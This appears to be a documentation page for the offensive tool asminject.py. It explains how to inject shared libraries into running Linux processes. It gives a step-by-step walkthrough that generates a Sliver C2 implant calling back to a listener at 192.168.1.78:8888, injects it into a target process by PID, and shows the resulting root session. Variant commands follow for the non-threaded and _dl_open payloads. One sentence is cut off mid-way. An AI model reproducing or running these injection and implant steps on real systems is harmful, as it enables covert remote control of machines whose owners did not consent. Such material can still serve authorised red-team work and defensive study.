# asminject.py examples - Shared library injection

* [Background](#background)
* [Create a world-readable copy of a file using only Linux syscalls](#create-a-world-readable-copy-of-a-file-using-only-linux-syscalls)
* [Execute arbitrary Python code inside an existing Python 3 process](#execute-arbitrary-python-code-inside-an-existing-python-3-process)
* [Execute arbitrary Python code inside an existing Python 2 process](#execute-arbitrary-python-code-inside-an-existing-python-2-process)
* [Execute arbitrary PHP code inside an existing PHP process](#execute-arbitrary-php-code-inside-an-existing-php-process)
* [Execute arbitrary Ruby code inside an existing Ruby process](#execute-arbitrary-ruby-code-inside-an-existing-ruby-process)
* [Inject Meterpreter into an existing process](#inject-meterpreter-into-an-existing-process)
* [Inject shellcode into a separate thread of an existing process](#inject-shellcode-into-a-separate-thread-of-an-existing-process)
* [Inject a Linux shared library (.so) file into an existing process, like the original dlinject.py](#inject-a-linux-shared-library-so-file-into-an-existing-process-like-the-original-dlinjectpy)
* [Inject a Linux shared library (.so) file into a new thread in an existing process](#inject-a-linux-shared-library-so-file-into-a-new-thread-in-an-existing-process)
* [Create a copy of a file using buffered read/write libc calls](#create-a-copy-of-a-file-using-buffered-readwrite-libc-calls)

## Background

Injecting a shared library (`.so` file) into an existing process was the entire purpose of the [dlinject.py](https://github.com/DavidBuchanan314/dlinject) tool that `asminject.py` was originally derived from. `asminject.py` includes several payloads to achieve the same type of goal, depending on the specifics of the Linux distribution where you're running it.

When `asminject.py` was originally developed, `dlinject.py` was hardcoded to look for a function named `_dl_open` in the `ld` library and call it. However, at least in 2021, not every Linux distribution included a version of the `ld` library that exported `_dl_open` or an equivalent function. Here are the permutations I've discovered so far while testing `asminject.py`:

* Debian and derivatives
  * Debian
    * Debian 10.6, ARM32 (Raspberry Pi)
	  * `libc` version is Debian GLIBC 2.28-10+rpi1
      * `ld` library does not export `_dl_open`
	  * `libdl` library exports `dlopen` with signature `void *dlopen([const] char *filename, int flags);`
	  * `libc` library exports `__libc_dlopen_mode`
  * Kali
    * kali-rolling (updated in June 2022), x86-64
      * `libc` version is Debian GLIBC 2.33-6
      * `ld` library does not export `_dl_open`
      * `libdl` library exports `dlopen` with signature `void *dlopen([const] char *filename, int flags);`
      * `libc` library exports `__libc_dlopen_mode`
* OpenSUSE
  * OpenSUSE Tumbleweed 20220719, x86 (32-bit)
    * `libc` version is GNU libc 2.35
    * `ld` library exports `_dl_open`, and the signature should be `void * _dl_open(const char *file, int mode, const void *caller_dlopen, Lmid_t nsid, int argc, char *argv[], char *env[]);`
	* `libdl` library does not export `dlopen`
	* `libc` library exports `dlopen` with signature `void *dlopen([const] char *filename, int flags);`

Some (older?) versions of `ld` allegedly use(d?) a simpler signature for `_dl_open`: `void * _dl_open(const char *file, int mode, const void *caller_dlopen);`, but I haven't run across this yet in order to test it.

In most cases, you should be able to use the first example below, because it handles both the `libdl` and `libc` variations on calling the `dlopen` function, and it's multithreaded, so the target process should continue as usual after the code is injected. The other options are provided for more constrained scenarios, e.g. if the target process doesn't have 

## dlopen with multithreading

This is the preferred option for injecting shared libraries into an existing process using `asminject.py`. It is the most straightfoward, best supported on various distributions, and the target process will continue executing normally after injection.

This payload requires one variable: `librarypath`, which should point to the library you want to inject.

This payload requires relative offsets for the `ld` shared library used by the target process.

Locate or build a `.so` file to open. For example, to set up a [Sliver]() C2 listener and implant:

```
# ./sliver-server     

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain infect
[*] Server v1.5.17 - 814670dc6d023f290fefd3e0fd7e0c420f9bb2e8
[*] Welcome to the sliver shell, please type 'help' for options

...omitted for brevity...

[server] sliver > mtls

[*] Starting mTLS listener ...

[server] sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 2    mtls   tcp        8888 

[server] sliver > generate --mtls=192.168.1.78:8888 --os=linux --arch=386 --format=shared --save=/home/user --skip-symbols

[*] Generating new linux/386 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 00:01:48
[*] Implant saved to /home/user/MAGENTA_NEEDLE.so
```

Inject the DLL into the target process:

```
# python3 ./asminject.py 1957286 dlinject_threaded.s --arch x86\
   --relative-offsets-from-binaries --stop-method "slow" \
   --var librarypath "/home/user/MAGENTA_NEEDLE.so"
```

Back in the Sliver console, you should see something like this:

```
[*] Session 5abe2db4 MAGENTA_NEEDLE - 10.1.10.216:5976 (localhost.localdomain) - linux/386 - Fri, 29 Jul 2022 15:35:21 PDT

[server] sliver (MAGENTA_NEEDLE) > sessions -i casminject_libc_or_libdl_dlopen

[!] Invalid session name or session number: casminject_libc_or_libdl_dlopen

[server] sliver > sessions -i 5abe2db4

[*] Active session MAGENTA_NEEDLE (5abe2db4)

[server] sliver (MAGENTA_NEEDLE) > info

        Session ID: 5abe2db4-cf75-46aa-bb41-7ad288028f0d
              Name: MAGENTA_NEEDLE
          Hostname: localhost.localdomain
              UUID: 0f444f35-de17-41a3-bc44-c30405c83d04
          Username: root
               UID: 0
               GID: 0
               PID: 30320
                OS: linux
           Version: Linux localhost.localdomain 5.18.11-1-pae
              Arch: 386
         Active C2: mtls://192.168.1.78:8888
    Remote Address: 10.1.10.216:5976
         Proxy URL: 
Reconnect Interval: 1m0s
```

Warning: do not cause the DLL to exit (in this case, using the `kill` Sliver console command) unless you want the target process to exist as well. You can avoid this by backgrounding the Sliver session instead of exiting.

## dlopen without multithreading

This option is identical, except that it does not spawn a separate thread. This has the downside of not allowing the target process to keep executing normally after injection, but means that `libpthread` is not required. Just swap out the payload name, e.g.:

```
# python3 ./asminject.py 1957286 dlinject.s --arch x86-64 \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var librarypath "/home/user/MAGENTA_NEEDLE.so"
```

Warning: do not cause the DLL to exit (in this case, using the `kill` Sliver console command) unless you want the target process to exist as well. You can avoid this by backgrounding the Sliver session instead of exiting.

## _dl_open

The `dlinject-ld.s` payload mimics the original `dlinject.py`, calling the `_dl_open` function that some versions of the `ld` library export (e.g. on OpenSUSE). It is currently an experimental feature, and only provided for the x86 architecture. From an operator perspective, it also only requires swapping out the payload name, but works differently under the hood.

```
# python3 ./asminject.py 1957286 dlinject-ld.s --arch x86 \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var librarypath "/home/user/MAGENTA_NEEDLE.so"
```
